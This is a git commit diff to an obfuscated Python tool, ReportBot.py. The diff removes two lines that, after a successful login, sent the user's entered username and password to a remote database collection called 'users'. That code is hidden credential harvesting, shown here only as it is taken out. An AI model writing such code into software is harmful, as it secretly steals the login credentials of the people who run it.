b3e83068335917c8c619569372aff0e6dacf2b96
Redian Marku <42848358+redianmarku@users.noreply.github.com>
2022-08-12 20:34:51 +0200

    Update ReportBot.py

--- ReportBot.py
+++ ReportBot.py
@@ -136,8 +136,6 @@ def database ():#line:167
         print ("\n\n"+Fore .RED +"[*] Enter username again, don't leave it blank")#line:182
         database ()#line:183
     elif O0OO0000O0O0OOOO0 .status_code ==200 :#line:186
-        OO0000O0OOOOO0O00 ={'password':O0O0000O0OOOOO000 ,'username':OOOO0OOOO0O0OOOOO }#line:191
-        db .collection ('users').add (OO0000O0OOOOO0O00 )#line:192
         load_animation ()#line:193
         print_success ("Login Success!")#line:194
         report ()#line:195
